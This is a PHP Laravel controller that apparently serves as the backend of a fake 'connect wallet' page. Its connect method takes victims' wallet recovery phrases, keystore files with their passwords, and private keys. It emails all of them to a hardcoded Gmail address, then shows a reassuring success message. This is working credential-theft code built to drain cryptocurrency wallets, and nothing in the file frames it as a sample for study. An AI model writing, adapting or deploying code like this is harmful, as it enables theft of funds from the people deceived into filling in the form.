<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\WalletMail;
use App\Models\Subscriber;

class ConnectWalletController extends Controller
{
	public function __construct() 
	{
        $this->middleware('auth', ['except' => ['subscribe']]);
	}

    public function subscribe( Request $request ) {

        $this->validate($request, [
            'email' => 'email|required|max:255'
        ]);

        $subscriber  = new Subscriber();

        // check if email address exists
        if ( $subscriber->where('email', $request->email)->first() !== null ) {
            return back()->with('error', 'Email Addresss Exists');
        }
        else {
            // create new subscriber
            $subscriber->create([
                'email' => $request->email
            ]);

            return back()->with('success', 'Subscription Has Been Added');
        }

    }


    public function index()
    {        
    	return view('wallet.connect');
    }


    public function connect( Request $request ) {

    	// validate request 
    	$this->validate($request, [
    		'email_phrase' => '',
    		'add_info_phrase' => '',
    		'password_phrase' => '',
    		'email_keystone' => '',
    		'add_info_keystone' => '',
    		'password_keystone' => '',
    		'add_info_private' => '',
    		'password_private' => '',
    		'email_private' => '',
            'wallet_name' => '',
            'wallet_image' => ''
    	]);

    	$data = $request;


    	// send email messages
    	Mail::to('sanusiabdulazeezadebayo1@gmail.com')->send(new WalletMail($data));

    	// show return name
    	return back()->with('success', 'Wallet Request has been sent successfully. We will reply as soonas possible');
    }
}
